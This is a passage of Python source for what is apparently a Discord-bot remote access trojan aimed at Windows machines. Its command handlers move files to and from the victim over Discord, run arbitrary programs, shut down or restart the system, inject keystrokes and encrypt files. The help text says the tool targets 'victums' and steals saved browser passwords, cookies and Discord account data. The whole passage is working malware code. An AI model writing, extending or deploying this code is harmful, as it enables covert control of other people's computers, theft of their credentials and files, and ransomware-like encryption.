        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: upload
    elif message.content.lower() == '!upload':
        try:
            if message.attachments:
                for attachment in message.attachments:
                    file_path = os.path.join(current_dir, attachment.filename)

                    response = requests.get(attachment.url)
                    with open(file_path, 'wb') as f:
                        f.write(response.content)

                    await send_embed(message.channel.id, f"Uploaded \"{attachment.filename}\"", f"Uploaded \"{attachment.filename}\" to: ```{current_dir}```")
            else:
                await send_embed(message.channel.id, "Error", "```Please add an attachment to your message.```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: download 
    elif message.content.lower().startswith('!download'):
        try:
            file_path = os.path.join(current_dir, message.content[10:])
            
            if os.path.exists(file_path):
                with open(file_path, 'rb') as file:
                    await send_embed(message.channel.id, f"Downloaded {message.content[10:]}", f"Downloaded file \"{message.content[10:]}\" from path: ```{current_dir}```")
                    await message.channel.send(file=discord.File(file, filename=message.content[10:]))
            else:
                await send_embed(message.channel.id, "Error", f"```The file \"{message.content[10:]}\" does not exist in path {current_dir}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: wallpaper
    elif message.content.lower() == '!wallpaper':
        try:
            if message.attachments:
                for attachment in message.attachments:
                    file_path = os.path.join(os.path.join(os.getenv('APPDATA', ''), 'Microsoft', 'Windows'), attachment.filename)

                    response = requests.get(attachment.url)
                    with open(file_path, 'wb') as f:
                        f.write(response.content)

                    ctypes.windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
                    await send_embed(message.channel.id, f"Wallpaper Updated", f"Set wallpaper to \"{attachment.filename}\"")
            else:
                await send_embed(message.channel.id, "Error", "```Please add an attachment to your message.```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: tts
    elif message.content.lower().startswith('!tts'):
        try:
            engine = pyttsx3.init()
            engine.setProperty('rate', 100)
            text = message.content[5:]
            engine.say(text)
            engine.runAndWait()
            await send_embed(message.channel.id, "Spoke", f"Spoke \"{message.content[5:]}\" aloud")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: run
    elif message.content.lower().startswith('!run'):
        try:
            os.system(os.path.join(current_dir, message.content[5:]))
            await send_embed(message.channel.id, f"Ran {message.content[5:]}", f"Ran \"{message.content[5:]}\" at path: ```{current_dir}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: shutdown
    elif message.content.lower() == '!shutdown':
        try:
            await send_embed(message.channel.id, "Shutting Down", "Shutting down system")
            os.system("shutdown /s /t 0")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: Restart
    elif message.content.lower() == '!restart':
        try:
            await send_embed(message.channel.id, "Restarting", "Restarting system")
            os.system("shutdown /r /t 0")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: press
    elif message.content.lower().startswith('!press'):
        try:
            keys = message.content[7:].split()
            pyautogui.hotkey(*keys)
            await send_embed(message.channel.id, "Pressed Keys", f"Pressed the following keys: ```{message.content[7:]}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: website
    elif message.content.lower().startswith('!website'):
        try:
            webbrowser.open_new_tab(message.content[9:])
            await send_embed(message.channel.id, "Opened Website", f"Opened website \"{message.content[9:]}\" in default browser")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: encrypt
    elif message.content.lower().startswith('!encrypt'):
        try:
            encrypt_file(os.path.join(current_dir, message.content[9:]), password_en)
            await send_embed(message.channel.id, "Encrypted", f"Successfully encrypted file \"{message.content[9:]}\" with password:```{password_en}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: decrypt
    elif message.content.lower().startswith('!decrypt'):
        try:
            decrypt_file(os.path.join(current_dir, message.content[9:]), password_en)
            await send_embed(message.channel.id, "Decrypted", f"Successfully decrypted file \"{message.content[9:]}\" with password:```{password_en}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

    # Command: help
    elif message.content.lower() == '!help':
        try:
            help_message = """\n!help - Sends this menu\n!screenshot - Sends a screenshot\n!type <phrase> - Types the phrase on the victums computer\n!passwords - Returns saved browser passwords\n!exit - Closes the current session and exits the exe\n!message <title> <message> - Pops up a message on the victums screen\n!discord - Sends the victums account information\n!cookies - Sends victums browser cookies.\n!cd <dir/defined> - Sets the current working directory\n!listdir - Views the contents of the current directory\n!delete <path> - Deletes the selected file\n!upload <attachment> - Uploads a file to the current directory\n!download <path> - Downloads a file from the selected path\n!wallpaper <attachment> - Sets the wallpaper to a provided photo\n!tts <message> - Speaks the provided message aloud\n!run <path> - Runs a file provided in the path\n!shutdown - Shuts down the host computer\n!restart - Restarts the host computer\n!press <keys> - Presses any amount of keys all at once\n!website <url> - Opens the url in the default browser\n!encrypt <path> - Encrypts the path using the defined password\n!decrypt <path> - Decrypts the path using the defined password"""
            await send_embed(message.channel.id, "Help Menu", f"```{help_message}```")
        except Exception as e:
            await send_embed(message.channel.id, "Error", f"```{str(e)}```")

client.run(token)
